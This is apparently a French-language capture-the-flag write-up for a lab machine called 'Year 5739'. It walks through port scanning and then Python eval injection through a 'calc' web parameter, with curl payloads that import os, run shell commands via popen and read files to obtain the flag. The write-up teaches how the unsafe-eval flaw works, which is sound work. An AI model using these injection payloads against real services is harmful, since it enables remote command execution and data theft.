# Year 5739 — Boot2Root

## 1. Informations générales

**Challenge :** Year 5739
**Difficulté :** Easy
**Objectif :** trouver le fichier `user.txt`
**IP cible :** `10.10.0.6`
**Port découvert :** `5739/tcp`

---

## 2. Reconnaissance

On commence par effectuer un scan complet des ports et une détection des services :

```bash
nmap -sC -sV -p- 10.10.0.6
```

Le scan retourne un seul port ouvert :

```text
5739/tcp open unknown
```

Les informations de fingerprinting indiquent cependant qu'il s'agit d'un serveur HTTP utilisant **Werkzeug 3.1.8** et **Python 3.13.5**.

On peut donc interroger directement le service :

```bash
curl -i http://10.10.0.6:5739/
```

La page contient un formulaire permettant d'envoyer une valeur avec le paramètre `calc` :

```html
<form action="/" method="get">
    Calculus : <input type="text" name="calc">
    <input type="submit" value="submit">
</form>
```

Un commentaire HTML est particulièrement intéressant :

```html
<!-- I don't really trust Tsukasa, so I left a backdoor here using the power of Python! -->
```

Cela suggère qu'une fonctionnalité Python particulière pourrait être exploitable.

---

## 3. Identification de l'évaluation Python

On commence par envoyer une expression mathématique simple :

```bash
curl -s 'http://10.10.0.6:5739/?calc=7*8' | grep -A2 'Result'
```

Le serveur retourne :

```text
Result : 7*8 = <pre>56</pre>
```

Cela indique que l'entrée n'est pas simplement affichée : elle est réellement évaluée.

Pour confirmer qu'il s'agit de Python, on utilise :

```bash
curl -s 'http://10.10.0.6:5739/?calc=type(1)' | grep -A2 'Result'
```

Résultat :

```text
Result : type(1) = <pre>&lt;class 'int'&gt;</pre>
```

On confirme ainsi que notre entrée est interprétée comme une **expression Python**.

---

## 4. Accès au module `os`

Une fois l'évaluation Python confirmée, on teste l'import du module `os` :

```bash
curl -s 'http://10.10.0.6:5739/?calc=__import__("os")' | grep -A2 'Result'
```

Résultat :

```text
<module 'os' (frozen)>
```

Le module `os` est donc accessible depuis l'expression évaluée.

Cela permet notamment d'interagir avec le système de fichiers et d'exécuter des commandes.

---

## 5. Reconnaissance du système

On vérifie d'abord le répertoire courant :

```bash
curl -G -s 'http://10.10.0.6:5739/' \
  --data-urlencode 'calc=__import__("os").getcwd()' | grep -A2 'Result'
```

Résultat :

```text
/
```

On peut également afficher le contenu du répertoire racine :

```bash
curl -G -s 'http://10.10.0.6:5739/' \
  --data-urlencode 'calc=__import__("os").listdir(".")' | grep -A2 'Result'
```

On obtient notamment :

```text
['run', 'proc', 'home', 'boot', 'bin', 'lib', 'mnt', 'sys',
 'var', 'srv', 'dev', 'sbin', 'root', 'tmp', 'etc', 'lib64',
 'opt', 'media', 'usr', '.dockerenv']
```

La présence de `/home` indique qu'il est pertinent de rechercher directement le fichier `user.txt`.

---

## 6. Recherche de `user.txt`

On utilise `os.popen()` pour exécuter une commande système :

```bash
curl -G -s 'http://10.10.0.6:5739/' \
  --data-urlencode 'calc=__import__("os").popen("find / -name user.txt 2>/dev/null").read()' \
  | grep -A2 'Result'
```

Le serveur retourne :

```text
/home/senku/user.txt
```

Le fichier recherché se trouve donc dans :

```text
/home/senku/user.txt
```

---

## 7. Récupération du flag

Il est maintenant possible de lire directement le fichier avec Python :

```bash
curl -G -s 'http://10.10.0.6:5739/' \
  --data-urlencode 'calc=open("/home/senku/user.txt").read()' \
  | grep -A2 'Result'
```

Résultat :

```text
EPI{********}
```

## 8. Flag

```text
EPI{********}
```

---

## 9. Vulnérabilité

La vulnérabilité exploitée est une **évaluation non sécurisée d'une entrée utilisateur comme expression Python**, très probablement à travers `eval()`.

Le serveur prend la valeur contrôlée par l'utilisateur dans `calc` et l'évalue directement.

Le problème peut être résumé ainsi :

```text
Entrée utilisateur
       ↓
     calc
       ↓
Évaluation Python
       ↓
__import__("os")
       ↓
Accès au système
       ↓
Recherche de user.txt
       ↓
Lecture du flag
```

Une entrée utilisateur ne devrait jamais être passée directement à `eval()` sans mécanisme de restriction extrêmement strict. Dans ce cas, l'absence de sandbox permet de passer d'un simple calcul mathématique à une interaction avec le système de fichiers et à l'exécution de commandes.

## 11. Conclusion

Le challenge repose sur une fonctionnalité de calcul vulnérable à l'injection de code Python. Après avoir identifié le service HTTP sur le port `5739`, l'utilisation de `type(1)` permet de confirmer que le paramètre `calc` est évalué comme du Python.

L'accès au module `os` permet ensuite d'explorer le système, de localiser `/home/senku/user.txt`, puis de lire son contenu directement depuis l'expression Python.

```text
EPI{********}
```
